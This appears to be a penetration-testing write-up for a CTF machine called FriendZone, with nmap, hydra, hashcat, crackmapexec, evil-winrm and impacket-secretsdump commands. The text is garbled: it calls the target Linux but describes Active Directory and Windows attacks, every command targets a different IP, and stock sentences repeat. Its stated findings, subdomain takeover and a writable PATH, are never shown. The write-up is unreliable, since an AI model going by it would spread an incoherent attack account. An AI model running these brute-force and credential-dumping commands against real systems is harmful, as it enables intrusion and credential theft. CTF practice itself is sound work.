---
TitleSEO: "VulnHub — FriendZone (Medium Linux) | ZureFX"
TitlePost: "VulnHub — FriendZone (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for VulnHub FriendZone. Subdomain Takeover and Writable PATH to achieve medium compromise on Linux."
Keywords: "medium, active directory, pwntilldawn, windows, ctf, offsec, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-friendzone-946.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-friendzone-946/"
Date: "2024-09-13"
Tags: "Medium, Active Directory, PwnTillDawn, Windows, CTF, OffSec, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-friendzone-946"
Permalink: "/writeups/htb-friendzone-946.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **FriendZone** is rated **Medium** on VulnHub. It runs **Linux** and the IP address during this analysis was `10.74.130.133`.

### Objectives

The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p1521,389,445 10.37.56.179 -oN scan.txt
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.71.40.239/FUZZ
```

Weak file permissions allowed modification of critical system files. The backup files contained sensitive information that should not have been accessible.

### Service Enumeration

The service account had excessive permissions assigned in Active Directory. The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
feroxbuster -h
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.35.218.101 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
nmap -sCV -p993,995,23 10.53.121.145 -oN scan.txt
```

Lateral movement was facilitated by reusing discovered credentials across services. The database credentials were hardcoded in the application source code.

### SMB Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
feroxbuster -h
nmap -sCV -p9200,8080,53 10.29.251.43 -oN scan.txt
crackmapexec smb 10.56.70.107 -u administrator -p 'P@ssw0rd!' --shares
```

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

## Exploitation

### Vulnerability Identification

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

Key finding: **Subdomain Takeover**.

Post-exploitation enumeration revealed a path to domain administrator privileges. The backup files contained sensitive information that should not have been accessible.

### Initial Access

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.36.82.196/FUZZ
crackmapexec smb 10.19.165.25 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.16.214.121 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files.

## Privilege Escalation

### Enumeration

Weak file permissions allowed modification of critical system files. Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files.

```bash
crackmapexec smb 10.99.188.198 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

```bash
evil-winrm -i 10.20.113.214 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.25.204.12
```

Network traffic analysis revealed unencrypted communications containing user credentials. Privilege escalation was possible due to misconfigured sudo permissions.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `smbclient`
- `dcomexec`
- `psexec`
- `chisel`
- `rpcclient`
- `mimikatz`
- `pwncat`

### Key Takeaways

- Subdomain Takeover
- Writable PATH
